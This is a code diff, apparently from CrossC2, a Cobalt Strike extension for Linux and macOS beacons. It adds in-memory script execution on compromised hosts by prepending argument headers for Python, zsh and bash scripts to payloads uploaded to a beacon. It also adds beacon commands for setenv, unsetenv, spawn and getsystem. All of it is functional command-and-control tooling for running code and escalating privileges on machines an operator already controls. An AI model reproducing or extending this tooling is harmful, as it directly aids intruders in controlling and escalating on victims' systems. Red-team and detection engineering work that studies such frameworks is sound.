@@ -63,6 +63,45 @@ sub genMemScriptInfo {
     return $taskinfo;
 }
 
+sub scriptArgsHook {
+    local('$scriptType @args $hook_header');
+    $scriptType = $1;
+    @args = $2;
+    $hook_header = "";
+
+    if ($scriptType eq "python") {
+        $hook_header = "import sys\nsys.argv=[";
+        foreach $index => $value (@args) {
+            $hook_header = $hook_header."'".$value."',";
+        }
+        $hook_header = $hook_header.']';
+    } else if ($scriptType eq "zsh") {
+        $hook_header = "";
+        foreach $index => $value (@args) {
+            $hook_header = $hook_header.$index."=\"".$value."\"\n";
+        }
+    } else if ($scriptType eq "bash") {
+        $hook_header = "set -- ";
+        foreach $index => $value (@args) {
+            if ($index == 0) {
+                continue;
+            }
+            # $hook_header = $hook_header."BASH_ARGV".$index."=\"".$value."\"\n";
+            $hook_header = $hook_header."\"".$value."\" ";
+        }
+    } else if ($scriptType eq "perl") {
+
+    } else if ($scriptType eq "ruby") {
+        
+    } else if ($scriptType eq "php") {
+        
+    }
+    $hook_header = $hook_header."\n";
+    # println($hook_header);
+
+    return $hook_header;
+}
+
 sub transportArg {
     $arg = "";
     foreach $index => $value (@_) {
@@ -86,6 +125,17 @@ sub transportArgs {
         }
     }
     return base64_encode($arg);
+}
+
+sub transportArgsArray {
+    $afterIndex = int($1) - 1;
+    @arg = @();
+    foreach $index => $value ($2) {
+        if ($index > $afterIndex) {
+            push(@arg,$value);
+        }
+    }
+    return @arg;
 }
 
 
@@ -174,7 +224,7 @@ sub brun_script_in_mem {
     $scriptEngPath = $3;
     $taskResType = $4;
     $loadFileName = $5;
-    $taskArgs = base64_encode($6);
+    @taskArgs = $6;
 
     $loadFilePath = script_resource($loadFileName);
     $juicySize = lof(script_resource($loadFileName));
@@ -188,8 +238,46 @@ sub brun_script_in_mem {
 
     $juicySize = lof($loadFileName);
 
-    $scriptName = genMemScriptInfo($scriptType, $scriptEngPath, $taskResType, $juicySize, $taskArgs);
-    bupload_raw!($beaconid,$scriptName,$juicyData);
+    $scriptName = genMemScriptInfo($scriptType, $scriptEngPath, $taskResType, $juicySize, "");
+    # blog($beaconid, "[brun_script_in_mem]: args = ".@taskArgs);
+
+    $header = scriptArgsHook($scriptType, @taskArgs);
+
+    bupload_raw!($beaconid,$scriptName,$header.$juicyData);
+}
+
+
+sub CrossC2MemScriptEng {
+    $taskResType = $2; # info -> normal message
+
+    $beaconid = $3[0];
+    $scriptType = $1;
+    $scriptEnginePath = 'null';
+
+    $contentType = $3[1];
+    $scriptLocalPath = $3[1];
+    $transportArg = $3[1];
+
+    $juicySize = lof($scriptLocalPath);
+    if ($juicySize == 0) {
+        $scriptLocalPath = "cc2_".$scriptType."_".random_string(6);
+        $transportArg = 'null';
+        $data = transportStrings(1, $3);
+        $out = openf(">" . $scriptLocalPath);          
+        writeb($out, $data);
+        closef($out);
+        brun_script_in_mem($beaconid, $scriptType, $scriptEnginePath, $taskResType, $scriptLocalPath, @());
+        deleteFile($scriptLocalPath);
+    } else {
+        @args = transportArgsArray(2, $3);
+        $pathIndex = lindexOf($scriptLocalPath, '/');
+        $pathIndex += 1;
+        $filename = substr($scriptLocalPath, $pathIndex);
+        add(@args, $filename);
+        blog($beaconid, "[cc2_memScript]: ".@args);
+        brun_script_in_mem($beaconid, $scriptType, $scriptEnginePath, $taskResType, $scriptLocalPath, @args);
+    }
+
 }
 
 sub bset_metadata {
@@ -224,6 +312,34 @@ sub bsethostname {
     $hostname = $2;
 
     bset_metadata($bid, "sethostname", $hostname);
+}
+
+sub bcc2_setenv {
+    if($1 && $2 && $3){
+        binput($1, "shell setenv $2 $3");
+        bshell($1, "setenv $2 $3");
+    } else {
+        berror($1, "*[error]: setenv env_name env_value");
+    }
+}
+
+sub bcc2_unsetenv {
+    if($1 && $2) {
+        binput($1, "shell unsetenv $2");
+        bshell($1, "unsetenv $2");
+    } else {
+        berror($1, "*[error]: unsetenv env_name");
+    }
+}
+
+sub bcc2_spawn {
+    binput($1, "shell spawn");
+    bshell($1, "spawn");
+}
+
+sub bcc2_getsystem {
+    binput($1, "shell getsystem");
+    bshell($1, "getsystem");
 }
 
 @fileupload_list = @();
